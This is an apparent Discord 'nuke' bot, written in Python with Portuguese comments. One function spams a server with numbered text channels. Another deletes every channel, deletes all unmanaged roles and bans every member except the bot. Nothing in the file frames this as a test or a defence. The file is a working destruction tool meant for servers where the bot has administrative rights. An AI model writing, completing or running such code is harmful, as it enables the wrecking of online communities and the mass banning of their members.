import discord
from discord.ext import commands
import asyncio
import os
import sys

# Configuração
TOKEN = os.getenv('DISCORD_TOKEN')

if TOKEN is None:
    print("❌ ERRO: DISCORD_TOKEN não encontrado!")
    sys.exit(1)

intents = discord.Intents.default()
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot online: {bot.user}")
    print(f"📡 Servidores:")
    for guild in bot.guilds:
        print(f"   • {guild.name} (ID: {guild.id})")

# ==================== FUNÇÕES DIRETAS ====================

async def criar_canais(guild_id, quantidade):
    """Cria canais diretamente"""
    guild = bot.get_guild(guild_id)
    if not guild:
        return {"erro": "Servidor não encontrado"}
    
    criados = 0
    for i in range(1, quantidade + 1):
        try:
            nome = f"G.D.P-{i:03d}"
            await guild.create_text_channel(nome)
            criados += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"Erro: {e}")
    
    return {"criados": criados}

async def limpar_servidor(guild_id):
    """Limpa o servidor diretamente"""
    guild = bot.get_guild(guild_id)
    if not guild:
        return {"erro": "Servidor não encontrado"}
    
    resultados = {"canais": 0, "cargos": 0, "banidos": 0}
    
    # Deletar canais
    for channel in guild.channels:
        try:
            await channel.delete()
            resultados["canais"] += 1
            await asyncio.sleep(0.3)
        except:
            pass
    
    # Deletar cargos
    for role in guild.roles:
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
                resultados["cargos"] += 1
                await asyncio.sleep(0.3)
            except:
                pass
    
    # Banir membros
    for member in guild.members:
        if member != guild.me:
            try:
                await member.ban(reason="Limpeza via site")
                resultados["banidos"] += 1
                await asyncio.sleep(1)
            except:
                pass
    
    return resultados

# ==================== INICIAR ====================
if __name__ == "__main__":
    bot.run(TOKEN)